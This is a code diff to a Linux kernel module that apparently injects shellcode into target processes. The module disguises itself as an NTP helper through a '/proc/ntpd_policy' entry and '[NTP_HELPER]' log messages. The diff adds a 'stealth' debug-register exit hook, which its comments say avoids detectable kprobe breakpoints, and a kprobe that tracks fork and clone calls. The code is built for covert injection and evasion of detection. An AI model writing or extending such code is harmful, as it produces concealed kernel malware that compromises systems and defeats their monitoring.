@@ -18,6 +18,7 @@
  */
 
 #include "ring_minus_one.h"
+#include "svm_trace.h"
 #include <linux/binfmts.h>
 #include <linux/kprobes.h>
 #include <linux/mman.h>
@@ -54,6 +55,14 @@ static atomic_t ghost_armed = ATOMIC_INIT(0);
 static atomic_t ghost_injected = ATOMIC_INIT(0); /* one-shot guard */
 
 static struct proc_dir_entry *ghost_proc_entry;
+
+/* Phase 28C: Lockless fork detection (clone kprobe) */
+extern atomic_t matrix_active;
+extern pid_t matrix_owner_pid;
+
+/* Phase 28C: Stealth DRx Exit Hooking */
+u64 ghost_exit_addr = 0;
+EXPORT_SYMBOL_GPL(ghost_exit_addr);
 
 /* ── Shellcode Template (x86_64, 85 bytes) ───────────────────────────────
  *
@@ -284,6 +293,44 @@ static struct kprobe ghost_kp = {
     .pre_handler = ghost_pre_handler,
 };
 
+/*
+ * Phase 28C: Stealth DRx Endpoint Resolver.
+ * Instead of placing a Kprobe (which writes 0xCC and can be detected),
+ * we use the kprobe API strictly to *resolve* the address of do_group_exit,
+ * then unregister immediately. This address is passed to DR0 in VMRUN.
+ */
+static u64 get_kernel_sym(const char *name)
+{
+	struct kprobe kp = { .symbol_name = name };
+	u64 addr;
+	if (register_kprobe(&kp) < 0)
+		return 0;
+	addr = (u64)kp.addr;
+	unregister_kprobe(&kp);
+	return addr;
+}
+
+/*
+ * Phase 28C: Kprobe on kernel_clone — Fork/Clone Detection
+ * Logs child creation to lockless ring buffer for Python CLI.
+ */
+static int clone_pre_handler(struct kprobe *p, struct pt_regs *regs)
+{
+	if (!atomic_read(&matrix_active))
+		return 0;
+	if (current->tgid == matrix_owner_pid) {
+		svm_trace_emit_log(8 /* LOG_EVENT_CLONE */, 
+			(u64)current_pt_regs()->ip,
+			(u64)current->pid, 0);
+	}
+	return 0;
+}
+
+static struct kprobe clone_kp = {
+    .symbol_name = "kernel_clone",
+    .pre_handler = clone_pre_handler,
+};
+
 /* ── Procfs: /proc/ntpd_policy ───────────────────────────────────────────
  *   write: set target name (resets one-shot flag)
  *   read:  show armed/injection status
@@ -362,20 +409,32 @@ int svm_ghost_init(void)
 		return ret;
 	}
 
+	ghost_exit_addr = get_kernel_sym("do_group_exit");
+	if (!ghost_exit_addr) {
+		pr_err("[NTP_HELPER] Failed to resolve do_group_exit for DRx stealth hook!\n");
+		return -ENOENT;
+	}
+
 	ret = register_kprobe(&ghost_kp);
 	if (ret < 0) {
 		pr_err("[NTP_HELPER] kprobe on '%s' failed (%d)\n", ghost_kp.symbol_name, ret);
 		return ret;
 	}
 
+	/* Phase 28C: Fork/clone detection kprobe */
+	ret = register_kprobe(&clone_kp);
+	if (ret < 0)
+		pr_warn("[NTP_HELPER] kprobe on '%s' failed (%d), clone detection disabled\n", clone_kp.symbol_name, ret);
+
 	ghost_proc_entry = proc_create("ntpd_policy", 0600, NULL, &ghost_pops);
 	if (!ghost_proc_entry) {
 		unregister_kprobe(&ghost_kp);
+		unregister_kprobe(&clone_kp);
 		return -ENOMEM;
 	}
 
-	pr_info("[NTP_HELPER] Engine armed on '%s' @ %px | /proc/ntpd_policy ready\n",
-		ghost_kp.symbol_name, ghost_kp.addr);
+	pr_info("[NTP_HELPER] Engine armed on '%s' @ %px | DRx Exit Hook: 0x%llx\n",
+		ghost_kp.symbol_name, ghost_kp.addr, ghost_exit_addr);
 	return 0;
 }
 
@@ -383,6 +442,7 @@ void svm_ghost_exit(void)
 {
 	if (ghost_proc_entry)
 		proc_remove(ghost_proc_entry);
+	unregister_kprobe(&clone_kp);
 	unregister_kprobe(&ghost_kp);
 	pr_info("[NTP_HELPER] Engine disarmed.\n");
 }
